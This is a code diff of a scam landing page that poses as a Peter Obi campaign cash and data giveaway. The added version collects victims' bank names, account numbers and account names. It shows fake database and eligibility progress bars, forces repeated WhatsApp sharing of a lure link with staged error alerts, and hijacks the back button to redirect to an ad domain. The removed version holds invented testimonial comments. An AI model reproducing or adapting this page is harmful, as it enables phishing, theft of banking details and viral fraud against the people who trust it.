-                <p class="title">Activating ₦15,000 + 25GB ...</p>
-                <div class="barr">
-                    <div class="fill">
-                        <div id="fill"></div>
-                    </div>
-                    <div class="percentage center">
-                        <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
-                        <span id="check"><i class="fa fa-check-circle"></i></span>
-                        <span id="percentage"></span>
-                    </div>
-                </div>
-            </div>
+        <div class="form-group">
+          <label>Bank <span class="text-danger">*</span></label>
+          <select id="country">
+            <option value="">Select Bank</option>
+           <option>Access Bank</option>
+            <option>Citibank Nigeria</option>
+            <option>Ecobank Nigeria</option>
+            <option>Fidelity Bank</option>
+            <option>First Bank of Nigeria</option>
+            <option>First City Monument Bank (FCMB)</option>
+            <option>Globus Bank</option>
+            <option>Guaranty Trust Bank (GTBank)</option>
+            <option>Jaiz Bank</option>
+            <option>Keystone Bank</option>
+            <option>Kuda Microfinance Bank</option>
+            <option>Lotus Bank</option>
+            <option>Moniepoint Microfinance Bank</option>
+            <option>OPay</option>
+            <option>Optimus Bank</option>
+            <option>PalmPay</option>
+            <option>Parallex Bank</option>
+            <option>Polaris Bank</option>
+            <option>PremiumTrust Bank</option>
+            <option>Providus Bank</option>
+            <option>Signature Bank</option>
+            <option>Stanbic IBTC Bank</option>
+            <option>Standard Chartered Bank</option>
+            <option>Sterling Bank</option>
+            <option>SunTrust Bank</option>
+            <option>TAJBank</option>
+            <option>Titan Trust Bank</option>
+            <option>Union Bank of Nigeria</option>
+            <option>United Bank for Africa (UBA)</option>
+            <option>Unity Bank</option>
+            <option>VFD Microfinance Bank</option>
+            <option>Wema Bank</option>
+            <option>Zenith Bank</option>
+            <option>Other</option>
+          </select>
+        </div>
+        
+        <div class="form-group">
+          <label>Account Number <span class="text-danger">*</span></label>
+          <input type="text" id="fullname" placeholder="10-digit account number">
         </div>
 
-        <div id="share">
-            <div class="post" width="100%" style="padding: 20px;">
-                <p class="tip"> Congratulations, <span id="getname"></span>،</p>
-                <p class="tip">
-                    Your ₦15,000 + 25GB  is <font color="red"><b>pending</b></font> because you have not completed the Human verification process
-                    <span class="amount"> Complete the verification process to receive your ₦15,000 + 25GB  now</span><br>
-                    <font color="red"><b>How to proceed?</b></font>
-                </p><br>
-                <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
-                <p class="tip">2. You will be redirected automatically to "ACTIVATION" page after the GREEN verification bar is filled.</p>
-
-                <button id="whatsapp"><font color="white">SHARE</font></button>
-                <div class="barr">
-                    <div class="fill">
-                        <div id="fill2"></div>
-                    </div>
-                    <div class="percentage center">
-                        <span><i class="fa fa-spinner fa-pulse"></i></span>
-                        <span id="percentage2">0%</span>
-                    </div>
-                </div>
-            </div>
+        <div class="form-group">
+          <label>Account Name <span class="text-danger">*</span></label>
+          <input type="text" id="fullname" placeholder="Enter your account name">
         </div>
+        
+        <button id="go" class="btn-primary">CONTINUE</button>
+      </div>
 
-        <div id="claim">
-            <div class="post" width="100%" style="padding: 20px;">
-                <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-                <p class="title"> Click "ACTIVATE" to activate your ₦15,000 + 25GB  </p>
-                <br />
-                <a onclick="window.open('https://uplcm.com/4/6993302')"
-                    href="https://uplcm.com/4/6993302">
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">WITHDRAW ₦15,000</font></button>
-                </a><br />
+      <!-- LOADER SECTION -->
+      <div id="loader" class="loader-container">
+        <div style="font-weight: 600; color: #0f172a;">Connecting to Database...</div>
+        <div class="spin"></div>
+        <div id="num" style="font-weight: 700; color: #0f5703;">0%</div>
+      </div>
 
-                <a onclick="window.open('https://uplcm.com/4/6993302')"
-                    href="https://uplcm.com/4/6993302">
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 25GB</font></button>
-                </a><br />
-
-                <center>
-                    <a onclick="window.open('https://uplcm.com/4/6993302')"
-                        href="https://uplcm.com/4/6993302">
-                        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">CHECK PAYMENT STATUS</font></button>
-                    </a><br />
-                </center>
-
-                <br />
-                <br />
-                <button id="offer">ACTIVATE</button><br />
-            </div>
+      <!-- CHECKING SECTION -->
+      <div id="checking" class="loader-container">
+        <p style="color: #0f172a; font-weight: 600;">Verifying your eligibility...</p>
+        <div class="progress-wrap">
+          <div class="progress-track">
+            <div class="progress-fill" id="fill"></div>
+          </div>
+          <div class="progress-meta">
+            <span>Processing...</span>
+            <span id="percentage">0%</span>
+          </div>
         </div>
+      </div>
 
-    
-        <div class="post" width="100%" style="margin-top: 10px;">
-            <div class="comments">
-                <div class="counter">
-                    <div class="reactions">
-                        <img class="like" src="https://i.imgur.com/g6cV61A.png" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" />
-                        <img class="care" src="https://i.imgur.com/sSMYbTT.png" /> <span id="likes">134K</span>
-                    </div>
-                    <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
-                </div>
-                <div class="bar">
-                    <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span>
-                    <span class="react"><i class="fa fa-comment-o"></i> Comment</span>
-                    <span class="react"><i class="fa fa-share"></i> Share</span>
-                </div>
-                <div class="comment">
-                    <img src="https://i.imgur.com/xp1ER6K.jpg" />
-                    <div class="single-container">
-                        <span class="user"> Joseph Emmanuel </span>
-                        <span class="text">
-                            I doubt this offer at first, but it's real. i just got my ₦15,000  thank you Mr. Peter Obi
-                        </span>
-                    </div>
-                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span>
-                        <span class="action liked">Like</span> · <span class="action">Reply</span></div>
-                </div>
-                <div class="comment">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5I3x2Ykht2M6Pktwjzc0xV7dmqJty_eCw4rDcFV5r_eDxXMRGWJF9tuYPEpe_fvnM0DtzfdDKbQUFKAhhnj1tXN97o8EJP_l_XFJeyX7dc1bm6bpocYaeGtrngVoV9TruTJrlONHypx0/s1600/FB_IMG_15869726679037399.jpg" />
-                    <div class="single-container"><span class="user">David Anthony</span>
-                        <span class="text"> I just received 25GB wow unbeleivable. thank you OBI </span></div>
-                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span>
-                        <span class="action liked">Like</span> · <span class="action">Reply</span></div>
-                </div>
-                <div class="comment reply">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgAg5sqDhd96nW2Ek_9vet4ztoELeaZmKUSIgzUImj18MpjZvy2qNPXaEgkSNOxLtEOvrT2iPc9RuUUmu2xnhRydySo5WIFpWEJiYmuMDqXnPKrqFzC8aABhp-mrUbaqinlsgJ5LA6hwZS/s1600/FB_IMG_15869730921979436.jpg" />
-                    <div class="single-container"><span class="user">Amahle John </span>
-                        <span class="text">My own is pending because i just finish sharing. Please help! </span></div>
-                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span>
-                        <span class="action liked">Like</span> · <span class="action">Reply</span></div>
-                </div>
-                <div class="comment">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" />
-                    <div class="single-container"><span class="user">Bonolo</span>
-                        <span class="text">My brother got 25GB from My MTN  already, i pray i get approved too</span></div>
-                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span>
-                        <span class="action liked">Like</span> · <span class="action">Reply</span></div>
-                </div>
-                <div class="input"><input placeholder="Write a comment..." /></div>
-            </div>
+      <!-- SHARE SECTION -->
+      <div id="share" class="share-section">
+        <p>Congratulations: <strong id="getname" style="color: #0f172a; font-size: 18px;"></strong>,</p>
+        <hr>
+        <p>Your details have been checked and you are <strong>pre-qualified</strong> for the Supporter Programme.</p>
+      <div class="form-group">
+        <label><h3><p class="text-danger" style="color: green;">Pending Payment: ₦30,000</p></h3></label>
+           </div>
+        <p class="amount">Final Step: Verification Required</p>
+        <p style="text-align: left; font-size: 14px;">
+          Your Application is awaiting approval, Follow the Instructions Below to Complete the Verification<br><br>
+          1. Share this information with 5 WhatsApp groups or 15 friends using the button below.<br><br>
+          2. Once the verification bar reaches 100%, you will be redirected to the final confirmation page.<br><br>
+          3. You will receive a payment of ₦30,000 within 2hours.
+        </p>
+        
+        <button id="whatsapp" class="btn-primary btn-success">Share on WhatsApp</button>
+        
+        <div class="progress-wrap">
+          <div class="progress-track">
+            <div class="progress-fill" id="fill2"></div>
+          </div>
+          <div class="progress-meta">
+            <span>Verification Progress</span>
+            <span id="percentage2">0%</span>
+          </div>
         </div>
+      </div>
+
+      <!-- CLAIM SECTION -->
+      <div id="claim" class="claim-section">
+        <div class="done"><i class="fa-solid fa-circle-check"></i></div>
+        <h2>Verification Complete!</h2>
+        <hr>
+        <p style="margin-bottom: 20px;">
+          Click the button below to finalize your Application.
+        </p>
+        
+        <a href="https://landing.logsbuzz.xyz/ads001" target="_blank">
+          <button class="btn-primary" style="background: #0f5703;">WITHDRAW ₦30,000</button>
+        </a>
+        
+        <br><br>
+        <!-- ADS LINK 1 -->
+        <a href="https://landing.logsbuzz.xyz/ads001" target="_blank">
+          <button class="btn-primary" style="background: #0f5703;">Submit Application</button>
+        </a>
+        
+        <br><br>
+        
+        <!-- ADS LINK 2 -->
+        <a href="https://landing.logsbuzz.xyz/ads001" target="_blank">
+          <button class="btn-primary" style="background: #0f172a;">Check Payment Status</button>
+        </a>
+        
+        <br><br>
+        
+        <!-- ADS LINK 2 -->
+        <a href="https://landing.logsbuzz.xyz/ads001" target="_blank">
+          <button class="btn-primary" style="background: #0f172a;">Check Your Supporter Role</button>
+        </a>
+        
+        <br><br>
+        <p style="font-size: 12px; color: #64748b;">
+          Thanks For Your Support
+        </p>
+      </div>
 
     </div>
+  </div>
 
-   <!-- BEGIN: Powered by Supercounters.com -->
-    <center>
-        <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
-        <script type="text/javascript">sc_online_i(1734337, "ffffff", "ffffff");</script>
-        <!-- END: Powered by Supercounters.com -->
-    </center>
-
-
-    <script src="https://code.jquery.com/jquery-latest.js"></script>
-
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <p>&copy; 2026 Peter Obi Movement for Sustainable Governance Foundation (TMS). All Rights Reserved.</p>
     
+    <!-- SUPERCOUNTER -->
+    <div class="supercounter-wrap">
+      <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+      <script type="text/javascript">sc_online_i(1741197,"ffffff","ffffff");</script>
+    </div>
+  </footer>
 
-    <script>
-        var text1 = "*PETER OBI INSTANT 25GB FREE DATA AND ₦15,000 CAMPAIGN REWARD*%0A%0APETER OBI Organization is giving out 25GB Free Data and ₦15,000 as part of 2026 campaign reward for all Nigerians🎉%0A%0A*I just got mine*%0A%0A_Get Yours Here Now_👇%0Ahttps://sutlnk.ink/OBI-CAMPAIGN-REWARD",
-            text2 = " an amount of ",
-            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
-            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "https://uplcm.com/4/6993302",
-            saved = "",
-            share = "whatsapp://send?text=" + text1;
-    </script>
-
-   
-    <script>
+  <!-- JAVASCRIPT LOGIC -->
+  <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+  <script>
     $(document).ready(function () {
-
-        var popupOverlay = document.getElementById('popupOverlay');
-        var popupForm = document.getElementById('popupForm');
-        var popupPhone = document.getElementById('popupPhone');
-        var bgImage = document.getElementById('bgImage');
-
-        // Show popup 500ms after page loads
-        setTimeout(function () {
-            popupOverlay.classList.add('active');
-        }, 500);
-
+      // Step 1: Intro -> Loader
+      $("#go").click(function () {
+        if ($("#fullname").val().length < 3) {
+          alert("Please enter your full name.");
+          return;
+        }
         
+        // REMOVED THE AGE CHECK HERE
+        
+        $("#intro").fadeOut(300);
+        $("#loader").fadeIn(300);
+        var i = 0;
+        var interval = setInterval(function () {
+          i++;
+          $("#num").text(i + "%");
+          if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(300);
+            
+            // Automatically transition to the checking phase
+            $("#checking").fadeIn(300);
+            var p = 0;
+            var interval2 = setInterval(function () {
+              p++;
+              $("#percentage").text(p + "%");
+              $("#fill").css("width", p + "%");
+              
+              if (p == 50) {
+                p = 49;
+                setTimeout(function () { p = 50; }, 900);
+              }
+              
+              if (p >= 100) {
+                clearInterval(interval2);
+                setTimeout(function () {
+                  $("#checking").fadeOut(300);
+                  $("#share").fadeIn(300);
+                  $("#getname").html($("#fullname").val());
+                }, 500);
+              }
+            }, 40);
+            
+          }
+        }, 30);
+      });
 
-        popupForm.addEventListener('submit', function (e) {
-            e.preventDefault();
-            var phone = popupPhone.value.trim();
-            if (phone.length < 8) {
-                alert('Please enter a valid phone number');
-                return;
-            }
-
-            window.savedPhone = phone;
-            $("#getname").text(phone);
-
-            // Close popup
-            popupOverlay.classList.remove('active');
-
-            // Hide the background image (only shown during popup)
-            bgImage.classList.remove('popup-bg-active');
-
-            // Scroll to top
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-
-            // Reveal the flow wrapper
-            $("#flowWrapper").show();
-            $("#loader").show();
-            $("#intro").hide();
-            $("#checking").hide();
-            $("#share").hide();
-            $("#claim").hide();
-
-            var i = 0;
-            var interval = setInterval(function () {
-                i++;
-                $("#num").text(i + "%");
-                if (i >= 100) {
-                    clearInterval(interval);
-                    $("#loader").hide();
-                    $("#intro").show();
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                }
-            }, 30);
-        });
-
-        $("#go").click(function () {
-            $("#intro").hide();
-            $("#checking").show();
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-
-            var i = 0;
-            var interval = setInterval(function () {
-                i++;
-                $("#percentage").text(i + "%");
-                $("#fill").css("width", i + "%");
-
-                if (i == 50) {
-                    i = 49;
-                    setTimeout(function () { i = 50; }, 900);
-                }
-
-                if (i >= 100) {
-                    clearInterval(interval);
-                    $("#load").hide();
-                    $("#check").show();
-                    setTimeout(function () {
-                        $("#checking").hide();
-                        $("#share").show();
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    }, 400);
-                }
-            }, 30);
-        });
-
-        var width = 0;
-
-        $("#whatsapp").click(function () {
-            window.location.href = share;
-
-            if (width == 0) {
-                width += 50;
-            } else if (width == 50) {
-                alert(error);
-                width += 15;
-            } else if (width == 65) {
-                width += 5;
-            } else if (width == 70) {
-                alert(error);
-                width += 10;
-            } else if (width == 80) {
-                alert(error);
-                width += 5;
-            } else if (width == 85) {
-                width += 2;
-            } else if (width == 87) {
-                width += 1;
-            } else if (width == 88) {
-                width += 2;
-            } else if (width == 90) {
-                width += 1;
-            } else if (width == 91) {
-                width += 1;
-            } else if (width == 92) {
-                width += 1;
-            } else if (width == 93) {
-                width += 1;
-            } else if (width == 94) {
-                width += 1;
-            } else if (width == 95) {
-                width += 1;
-            } else if (width == 96) {
-                width += 2;
-            } else {
-                $("#share").fadeOut(0);
-                $("#claim").fadeIn(1000);
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-                return;
-            }
-
-            setTimeout(function () {
-                $("#fill2").css("width", width + "%");
-                $("#percentage2").text(width + "%");
-            }, 1000);
-        });
-
-        $("#offer").click(function () {
-            window.open(abcde, "_blank");
-        });
-
-        window.numberonly = function (evt) {
-            var charCode = (evt.which) ? evt.which : evt.keyCode;
-            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
-                return false;
-            }
-            return true;
-        };
+      
+      // Step 2: Share Logic
+      var width = 0;
+      $("#whatsapp").click(function () {
+        var shareText = "*Join the Peter Obi Supporters Programme *%0A%0AI just Join The Peter Obi Supporter Programme for 2027.%0AJoin Now and receive Payment of *₦30,000* for 3 Months.%0A%0AApply below👇%0Ahttps://sutlnk.ink/Obidient-2027";
+        
+        window.location.href = "whatsapp://send?text=" + shareText;
+        
+        if (width == 0) { width += 50; }
+        else if (width == 50) { alert("An error occurred! The messages are not being read. You may have shared this message with friends or the same group multiple times; please share it again."); width += 15; }
+        else if (width == 65) { width += 5; }
+        else if (width == 70) { alert("An error occurred! The messages are not being read. You may have shared this message with friends or the same group multiple times; please share it again."); width += 10; }
+        else if (width == 80) { alert("An error occurred! The messages are not being read. You may have shared this message with friends or the same group multiple times; please share it again."); width += 5; }
+        else if (width == 85) { width += 2; }
+        else if (width == 87) { width += 1; }
+        else if (width == 88) { width += 2; }
+        else if (width == 90) { width += 1; }
+        else if (width == 91) { width += 1; }
+        else if (width == 92) { width += 1; }
+        else if (width == 93) { width += 1; }
+        else if (width == 94) { width += 1; }
+        else if (width == 95) { width += 1; }
+        else if (width == 96) { width += 2; }
+        else {
+          $("#share").fadeOut(300);
+          $("#claim").fadeIn(500);
+          return;
+        }
+        
+        setTimeout(function () {
+          $("#fill2").css("width", width + "%");
+          $("#percentage2").text(width + "%");
+        }, 1000);
+      });
     });
-    </script>
+  </script>
 
-    
+  <!-- ═══════════════════════════════════════════
+       BACK BUTTON REDIRECT SCRIPT (ADS LINK 3)
+  ═══════════════════════════════════════════ -->
+  <script>
+    window.onhashchange = function() { jp(); };
+    function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+    function jp() { fh(); }
+    setTimeout('hh();', 500);
+    function fh() { location.href = "https://landing.logsbuzz.xyz/ads001"; }
+    function goon() { location.href = "https://landing.logsbuzz.xyz/ads001"; }
+  </script>
 
+<script>
+    // Set the date we're counting down to (Jan 16, 2027 00:00:00)
+    var countDownDate = new Date("Jan 16, 2027 00:00:00").getTime();
 
-    <script>
-        window.onhashchange = function () { jp(); };
-        function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
-        function jp() {
-            fh();
+    var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+
+        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        // Add leading zeros if numbers are less than 10
+        document.getElementById("cd-days").innerText = days < 10 ? "0" + days : days;
+        document.getElementById("cd-hours").innerText = hours < 10 ? "0" + hours : hours;
+        document.getElementById("cd-minutes").innerText = minutes < 10 ? "0" + minutes : minutes;
+        document.getElementById("cd-seconds").innerText = seconds < 10 ? "0" + seconds : seconds;
+
+        // If the countdown is over, stop the timer and keep it at 00
+        if (distance < 0) {
+            clearInterval(x);
+            document.getElementById("cd-days").innerText = "00";
+            document.getElementById("cd-hours").innerText = "00";
+            document.getElementById("cd-minutes").innerText = "00";
+            document.getElementById("cd-seconds").innerText = "00";
         }
-        setTimeout('hh();', 500);
-        function fh() {
-            location.href = "https://uplcm.com/4/6993302";
-        }
-        function goon() {
-            location.href = "https://uplcm.com/4/6993302";
-        }
-    </script>
-
+    }, 1000);
+</script>
+  
 </body>
 </html>
+
